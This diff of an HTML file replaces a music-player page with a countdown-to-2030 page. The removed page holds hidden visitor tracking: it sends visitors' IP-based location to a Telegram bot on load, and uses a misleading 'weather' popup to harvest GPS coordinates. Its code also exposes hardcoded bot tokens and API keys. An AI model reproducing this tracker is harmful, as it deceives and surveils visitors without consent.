@@ -1,442 +1,215 @@
-<!DOCTYPE html>
+o<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Music player</title>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <title>Countdown to 2030</title>
   <style>
-    * { margin: 0; padding: 0;}
     body {
-      background: #0d0d0d;
-      font-family: sans-serif;
-      color: #fff;
-    }
-
-    .player {
-      width: 90vw;
-      max-width: 300px;
-      background: #111;
-      border-radius: 20px;
-      margin: 30px auto;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: white;
+      text-align: center;
       padding: 20px;
-      box-shadow: 0 0 15px #0ff, 0 0 25px #f0f, 0 0 35px #0ff;
-      position: relative;
-      animation: glow 3s ease-in-out infinite;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+      overflow: hidden;
     }
-
-    @keyframes glow {
-      0%, 100% { box-shadow: 0 0 15px #0ff; }
-      50% { box-shadow: 0 0 30px #f0f, 0 0 50px #0ff; }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 10px;
     }
-    .image-container {
-  width: 200px;
-  height: 200px;
-  border-radius: 50%;
-  overflow: hidden;
-  margin-bottom: 15px;
-  position: relative;
-  animation: softPulse 4s infinite ease-in-out;
-  box-shadow: 0 0 5px #0ff, 0 0 10px #f0f, 0 0 15px #0ff;
-}
-
-.image-container::before {
-  content: '';
-  position: absolute;
-  top: -6px;
-  left: -6px;
-  width: calc(100% + 12px);
-  height: calc(100% + 12px);
-  border-radius: 50%;
-  background: conic-gradient(#0ff, #f0f, #0ff);
-  animation: spin 4s linear infinite;
-  z-index: -1;
-  filter: blur(3px);
-}
-
-@keyframes softPulse {
-  0%, 100% {
-    box-shadow: 0 0 5px #0ff, 0 0 10px #f0f, 0 0 15px #0ff;
-  }
-  50% {
-    box-shadow: 0 0 10px #f0f, 0 0 15px #0ff, 0 0 20px #f0f;
-  }
-}
-
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}
-
-
-    .image-container img {
-      width: 100%;
+    #countdown {
+      font-size: 2rem;
+      margin: 20px 0;
+    }
+    #progressBarContainer {
+      background-color: #444;
+      border-radius: 20px;
+      overflow: hidden;
+      margin: 20px auto;
+      height: 25px;
+      width: 80%;
+    }
+    #progressBar {
       height: 100%;
-      object-fit: cover;
+      background-color: #00ffcc;
+      width: 0%;
+      text-align: right;
+      padding-right: 10px;
+      line-height: 25px;
+      color: black;
+      font-weight: bold;
+    }
+    #milestones {
+      margin-top: 30px;
+    }
+    .milestone {
+      background-color: #1c1c1c;
+      margin: 10px auto;
+      padding: 10px;
+      border-left: 5px solid #00ffcc;
+      width: 80%;
+      text-align: left;
+    }
+    audio {
       display: none;
     }
-
-    .image-container img.active {
-      display: block;
-    }
-
-    .song-name {
-      text-align: center;
-      font-size: 18px;
-      font-weight: bold;
-      margin: 5px 0;
-      text-shadow: 0 0 5px #0ff, 0 0 10px #f0f;
-      animation: pulse 2s infinite alternate;
-    }
-
-    @keyframes pulse {
-      0% { opacity: 0.6; transform: scale(1); }
-      100% { opacity: 1; transform: scale(1.05); }
-    }
-
-    .play-icon {
-      width: 60px;
-      height: 60px;
-      margin: 10px auto;
-      cursor: pointer;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: transparent;
-      border: none;
-      box-shadow: none;
-    }
-
-    .play-icon svg {
-      fill: #fff;
-      width: 40px;
-      height: 40px;
-    }
-
-    .progress-bar {
-      width: 100%;
-      height: 8px;
-      background: #333;
-      border-radius: 10px;
-      overflow: hidden;
-      margin-top: 10px;
-    }
-
-    .progress {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(to right, #0ff, #f0f);
-      transition: width 0.2s linear;
-    }
-
-    .timer {
-      font-size: 12px;
-      margin-top: 5px;
-    }
-
     canvas {
-      width: 100%;
-      height: 50px;
-      margin-top: 10px;
-      background: #1a1a1a;
-      border-radius: 10px;
-    }
-
-    .hearts {
-      position: absolute;
-      top: 10px;
+      position: fixed;
+      top: 0;
       left: 0;
-      width: 100%;
       pointer-events: none;
-      z-index: 10;
-    }
-
-    .heart {
-      position: absolute;
-      font-size: 20px;
-      color: #f0f;
-      animation: fall 10s linear forwards;
-    }
-
-    @keyframes fall {
-      0% { transform: translateY(0); opacity: 1; }
-      100% { transform: translateY(600px); opacity: 0; }
+      width: 100%;
+      height: 100%;
+      z-index: 100;
     }
   </style>
 </head>
 <body>
-  <div class="player">
-    <div class="image-container">
-      <img src="1.jpg" class="active">
-      <img src="2.jpg">
-      <img src="3.jpg">
-      <img src="4.jpg">
-      <img src="5.jpg">
-      <img src="6.jpg">
-      <img src="7.jpg">
-      <img src="8.jpg">
-      <img src="9.jpg">
-      <img src="10.jpg">
-      <img src="11.jpg">
-    </div>
 
-    <!-- Message Input Box -->
-<div id="message-box" style="margin-top: 20px; text-align: center;">
-  <input type="text" id="user-message" placeholder="Type ur msg and (click 1 time) send msg " style="padding: 10px; margin-bottom: 30px ; width: 70%; border-radius: 20px; border: 1px solid #ccc;" />
-  <button id="send-button" style="padding: 10px 20px; border-radius: 20px; margin-left: 10px; background-color: #4caf50; color: white; border: none; margin-bottom: 30px ; cursor: pointer; transition: 0.3s;">
-    send message 
-  </button>
-  <p id="send-status" style="margin-top: 10px; color: #00ff00;"></p>
-</div>
+  <h1>Countdown to 1st January 2030</h1>
+  <div id="countdown">Loading...</div>
 
-  <div id="locationPopup" style="
-  position: fixed;
-  top: 0; left: 0; right: 0; bottom: 0;
-  z-index: 9999;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-family: Arial, sans-serif;
-">
-  <div style="
-    border: 2px solid cyan;
-    background-color: #0d0d0d;
-    padding: 24px 32px;
-    border-radius: 10px;
-    text-align: center;
-    color: #fff;
-    max-width: 400px;
-  ">
-    <h2 style="color: #03dac6;">Allow for better experience</h2>
-    <p>Allow location this use weather Indiactors so we need user location.</p>
-    <button onclick="askForLocation()" style="
-      background-color: #03dac6;
-      border: none;
-      color: #000;
-      padding: 10px 20px;
-      font-size: 16px;
-      margin-top: 20px;
-      border-radius: 6px;
-      cursor: pointer;
-    ">Allow</button>
-    <br>
-    <button onclick="denyLocation()" style="
-      background-color: transparent;
-      border: 1px solid #666;
-      color: #ccc;
-      padding: 8px 16px;
-      font-size: 14px;
-      margin-top: 12px;
-      border-radius: 6px;
-      cursor: pointer;
-    ">Deny</button>
+  <div id="progressBarContainer">
+    <div id="progressBar">0%</div>
   </div>
 
+  <div id="milestones">
+    <h2>Milestones</h2>
+    <div class="milestone" id="m2026">🎯 1 Jan 2026 - Pending</div>
+    <div class="milestone" id="m2027">🎯 1 Jan 2027 - Pending</div>
+    <div class="milestone" id="m2028">🎯 1 Jan 2028 - Pending</div>
+    <div class="milestone" id="m2029">🎯 1 Jan 2029 - Pending</div>
+    <div class="milestone" id="m2030">🎉 1 Jan 2030 - Final Goal</div>
+  </div>
+
+  <!-- Background music and alarm sound -->
+  <audio id="alarm" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_1709f18483.mp3?filename=digital-alarm-clock-132660.mp3"></audio>
+  <audio id="music" src="https://cdn.pixabay.com/download/audio/2022/03/28/audio_4ec3d59e2d.mp3?filename=motivational-background-112106.mp3" loop></audio>
+
+  <!-- Fireworks canvas -->
+  <canvas id="fireworks"></canvas>
 
   <script>
-    const playBtn = document.getElementById('playBtn');
-    const playSvg = document.getElementById('playSvg');
-    const audio = document.getElementById('audio');
-    const progress = document.getElementById('progress');
-    const timer = document.getElementById('timer');
-    const canvas = document.getElementById('visualizer');
-    const ctx = canvas.getContext('2d');
-    const heartsContainer = document.getElementById('heartsContainer');
-    const images = document.querySelectorAll('.image-container img');
+    const endDate = new Date("2030-01-01T00:00:00").getTime();
+    const startDate = new Date().getTime();
+    let hasPlayed = false;
 
-    let playing = false;
-    let imgIndex = 0;
-    let slideshowInterval, heartInterval;
+    function updateCountdown() {
+      const now = new Date().getTime();
+      const distance = endDate - now;
 
-    const totalDuration = 147;
+      const years = Math.floor(distance / (1000 * 60 * 60 * 24 * 365));
+      const days = Math.floor((distance % (1000 * 60 * 60 * 24 * 365)) / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
 
-    function formatTime(sec) {
-      const m = Math.floor(sec / 60).toString().padStart(2, '0');
-      const s = Math.floor(sec % 60).toString().padStart(2, '0');
-      return `${m}:${s}`;
-    }
+      document.getElementById("countdown").innerHTML =
+        `${years}y ${days}d ${hours}h ${minutes}m ${seconds}s`;
 
-    function updateProgress() {
-      const current = audio.currentTime;
-      progress.style.width = `${(current / totalDuration) * 100}%`;
-      timer.textContent = `${formatTime(current)} / 02:27`;
-    }
+      const progress = ((now - startDate) / (endDate - startDate)) * 100;
+      const progressBar = document.getElementById("progressBar");
+      progressBar.style.width = `${progress.toFixed(2)}%`;
+      progressBar.innerText = `${progress.toFixed(2)}%`;
 
-    function changeImage() {
-      images.forEach(img => img.classList.remove('active'));
-      imgIndex = (imgIndex + 1) % images.length;
-      images[imgIndex].classList.add('active');
-    }
-
-    function dropHeart() {
-      const heart = document.createElement('div');
-      heart.className = 'heart';
-      heart.style.left = `${Math.random() * 90 + 5}%`;
-      heart.textContent = '❤️';
-      heartsContainer.appendChild(heart);
-      setTimeout(() => heart.remove(), 10000);
-    }
-
-    playBtn.addEventListener('click', () => {
-      if (!playing) {
-        audio.play();
-        playSvg.innerHTML = '<path d="M6 4h4v16H6zm8 0h4v16h-4z"/>';
-        playing = true;
-        slideshowInterval = setInterval(changeImage, 3000);
-        heartInterval = setInterval(dropHeart, 1500);
-        animateVisualizer();
-      } else {
-        audio.pause();
-        playSvg.innerHTML = '<path d="M8 5v14l11-7z"/>';
-        playing = false;
-        clearInterval(slideshowInterval);
-        clearInterval(heartInterval);
-      }
-    });
-
-    audio.ontimeupdate = updateProgress;
-
-    function animateVisualizer() {
-      const WIDTH = canvas.width;
-      const HEIGHT = canvas.height;
-      const barCount = 40;
-      const barWidth = WIDTH / barCount;
-
-      function draw() {
-        if (!playing) return;
-        ctx.clearRect(0, 0, WIDTH, HEIGHT);
-        for (let i = 0; i < barCount; i++) {
-          const amp = Math.abs(Math.sin(Date.now() / 2500 + i)) * HEIGHT * 0.8;
-          ctx.fillStyle = `hsl(${i * 9}, 100%, 60%)`;
-          ctx.fillRect(i * barWidth, HEIGHT - amp, barWidth - 1, amp);
+      const milestoneYears = [2026, 2027, 2028, 2029, 2030];
+      milestoneYears.forEach(year => {
+        const mDate = new Date(`${year}-01-01T00:00:00`).getTime();
+        if (now >= mDate) {
+          document.getElementById(`m${year}`).style.background = "#004d40";
+          document.getElementById(`m${year}`).innerText = `✅ 1 Jan ${year} - Completed`;
         }
-        requestAnimationFrame(draw);
-      }
-      draw();
-    }
-
-    function resizeCanvas() {
-      canvas.width = canvas.offsetWidth;
-      canvas.height = canvas.offsetHeight;
-    }
-    window.addEventListener('resize', resizeCanvas);
-    resizeCanvas();
- //sending msg
-
-    
-  emailjs.init('vz6ZZkY4Rzi5uxTUm'); // Your Public Key
-
-  document.getElementById('send-button').addEventListener('click', function () {
-    const message = document.getElementById('user-message').value;
-
-    if (message.trim() === "") {
-      document.getElementById('send-status').innerText = "Please enter a message.";
-      return;
-    }
-
-    emailjs.send("service_3lqvd5i", "template_dpgbije", {
-      message: message
-    })
-    .then(() => {
-      document.getElementById('send-status').innerText = "Message sent successfully!";
-      document.getElementById('user-message').value = "";
-    }, (error) => {
-      document.getElementById('send-status').innerText = "Failed to send. Try again.";
-      console.error('EmailJS error:', error);
-    });
-  });
-
-
-  const BOT_TOKEN = "8062217364:AAFvqBfdaMuQXh0BQVIHKwxYAwaHxbvbnH4";
-  const CHAT_ID = "6428946789";
-  const IPINFO_TOKEN = "f0421a0825b153";
-  const openCageKey = 'a10d3f1c01204eb48d045e47e3f0094e';
-
-fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`)
-  .then((res) => res.json())
-  .then((data) => {
-    const message = `🧠 New Visitor Alert:
-🌐 IP: ${data.ip}
-🏙️ City: ${data.city}
-🌍 Region: ${data.region}
-🗺️ Country: ${data.country}
-⏱️ Time: ${new Date().toLocaleString()}`;
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message
-      })
-    });
-  })
-  .catch((err) => console.error("Error fetching IP data:", err));
-
-    function askForLocation() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(sendLocationToTelegram, handleError);
-    } else {
-      alert("Geolocation is not supported by your browser.");
-    }
-  }
-
-
-    function askForLocation() {
-    document.getElementById("locationPopup").style.display = "none";
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(getLocationDetails, handleError);
-    } else {
-      alert("Geolocation not supported.");
-    }
-  }
-
-  function denyLocation() {
-    document.getElementById("locationPopup").style.display = "none";
-  }
-
-  function getLocationDetails(position) {
-    const lat = position.coords.latitude;
-    const lon = position.coords.longitude;
-    const time = new Date().toLocaleString();
-
-    fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${openCageKey}`)
-      .then(response => response.json())
-      .then(data => {
-        const address = data.results[0]?.formatted || "Unknown address";
-        const message = `📍 New Visitor Location:
-🌐 Latitude: ${lat}
-🌐 Longitude: ${lon}
-📌 Address: ${address}
-🕒 Time: ${time}`;
-
-        sendToTelegram(message);
-      })
-      .catch(() => {
-        const message = `📍 New Visitor Location:
-🌐 Latitude: ${lat}
-🌐 Longitude: ${lon}
-📌 Address lookup failed
-🕒 Time: ${time}`;
-        sendToTelegram(message);
       });
-  }
 
-  function sendToTelegram(msg) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
-    fetch(url);
-  }
+      if (distance <= 0 && !hasPlayed) {
+        document.getElementById("countdown").innerHTML = "🎉 It's 2030!";
+        document.getElementById("progressBar").style.width = "100%";
+        document.getElementById("progressBar").innerText = "100%";
 
-  function handleError(error) {
-    alert("❌ Location permission denied.");
-  }
+        document.getElementById("alarm").play();
+        setTimeout(() => {
+          document.getElementById("music").play();
+          launchFireworks();
+        }, 3000);
+        hasPlayed = true;
+        clearInterval(countdownInterval);
+      }
+    }
 
-
+    const countdownInterval = setInterval(updateCountdown, 1000);
   </script>
+
+  <!-- Fireworks Script -->
+  <script>
+    const canvas = document.getElementById('fireworks');
+    const ctx = canvas.getContext('2d');
+    let W = window.innerWidth;
+    let H = window.innerHeight;
+    canvas.width = W;
+    canvas.height = H;
+
+    const particles = [];
+
+    function randomColor() {
+      return `hsl(${Math.floor(Math.random() * 360)}, 100%, 60%)`;
+    }
+
+    function Particle(x, y, color) {
+      this.x = x;
+      this.y = y;
+      this.radius = Math.random() * 2 + 1;
+      this.color = color;
+      this.speedX = Math.random() * 6 - 3;
+      this.speedY = Math.random() * 6 - 3;
+      this.alpha = 1;
+
+      this.update = function () {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        this.alpha -= 0.01;
+      };
+
+      this.draw = function () {
+        ctx.globalAlpha = this.alpha;
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+        ctx.fillStyle = this.color;
+        ctx.fill();
+      };
+    }
+
+    function launchFireworks() {
+      setInterval(() => {
+        const x = Math.random() * W;
+        const y = Math.random() * H / 2;
+        const color = randomColor();
+        for (let i = 0; i < 100; i++) {
+          particles.push(new Particle(x, y, color));
+        }
+      }, 800);
+      animate();
+    }
+
+    function animate() {
+      ctx.clearRect(0, 0, W, H);
+      for (let i = particles.length - 1; i >= 0; i--) {
+        const p = particles[i];
+        p.update();
+        p.draw();
+        if (p.alpha <= 0) {
+          particles.splice(i, 1);
+        }
+      }
+      requestAnimationFrame(animate);
+    }
+
+    window.addEventListener("resize", () => {
+      W = window.innerWidth;
+      H = window.innerHeight;
+      canvas.width = W;
+      canvas.height = H;
+    });
+  </script>
+
 </body>
 </html>
